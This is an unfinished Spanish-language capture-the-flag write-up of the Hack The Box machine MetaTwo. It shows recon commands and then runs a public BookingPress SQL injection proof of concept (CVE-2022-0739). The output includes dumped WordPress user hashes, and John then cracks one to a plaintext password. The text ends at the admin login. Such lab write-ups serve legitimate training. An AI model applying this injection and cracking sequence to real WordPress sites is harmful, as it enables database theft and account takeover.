---
title: MetaTwo WriteUp
author: H4ckerLite 
date: 2023-03-21 00:00:00 +0800
categories: [hackthebox, machine, writeup]
tags: [linux, hackthebox, writeup, easy, wordpress, sql injection, virtual hosting]
image:
  path: ../../assets/img/commons/metatwo-writeup/MetaTwo.png 
  alt: Inject WriteUp
pin: true
---

Hoy toca compremeter la máquina [MetaTwo](https://app.hackthebox.com/machines/metatwo) de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de de un plugin de  `Word Press`, usando dicha vulnerabilidad podemos dumpear la base de datos y obtener el Usuario y la contraseña del usuario de **Word Press**,


## Enumeración

### Identificando el OS
Enviando trazas **ICMP**  `(Internet Control Message Protocol)` y usando el **TTL**`(Time to Live)` podemos identificar el OS.

```bash
❯ ping -c1 10.10.11.186
PING 10.10.11.186 (10.10.11.186) 56(84) bytes of data.
64 bytes from 10.10.11.186: icmp_seq=1 ttl=63 time=156 ms

--- 10.10.11.186 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 156.106/156.106/156.106/0.000 ms
```

### NMAP

Si realizamos un escaneo de puertos, encontramos:

```bash
❯ nmap 10.10.11.186
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 12:53 -04
Nmap scan report for 10.10.11.186
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.43 seconds
```
### Analizando la Web

Si intentamos acceder a la web, nos redirige, para solucionar esto hacemos:
```bash
echo '10.10.11.186   metapress.htb' | tee -a /etc/hosts
```
Cone esto arreglamos el problema de virtual hosting.

![Web ]({{ 'assets/img/commons/metatwo-writeup/1.png' | relative_url }}){: .center-image }
_Web_

si ingresamos a la direcciñon que nos [muestra](http://metapress.htb/events) vemos esto:

![Events ]({{ 'assets/img/commons/metatwo-writeup/2.png' | relative_url }}){: .center-image }
_Events_

Si miramos el código fuente vemos que usa el plugin `booking-press v1.0.10` si buscamos un exploit para esa versión, encontramos [este](https://github.com/destr4ct/CVE-2022-0739) y este [otro](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357).


Creamos un evnto y en todos los campos de texto colocamos `bookingpress_form`.

![Events ]({{ 'assets/img/commons/metatwo-writeup/4.png' | relative_url }}){: .center-image }
_BookingPress_

Ahora vemos el código fuente y buscamos por `once` y copiamos ese pin. Con el exploit que les compartí podemos dumpear la base de datos.

```bash
❯ python3 exploit.py -u http://metapress.htb -n 30594111b0
- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|

```
Ahora copiamos el hash y lo intentamos crakear con john.

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (manager)
1g 0:00:00:03 DONE (2023-03-24 14:36) 0.2617g/s 28950p/s 28950c/s 28950C/s poochini..music69
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed
```
Podemos autenticarnos con Word Press.


## Comprometiendo la máquina

Accedemos al panel de [WordPress](http://metapress.htb/wp-admin).

![Events ]({{ 'assets/img/commons/metatwo-writeup/5.png' | relative_url }}){: .center-image }
_WP Login_




Más tarde continuo.........
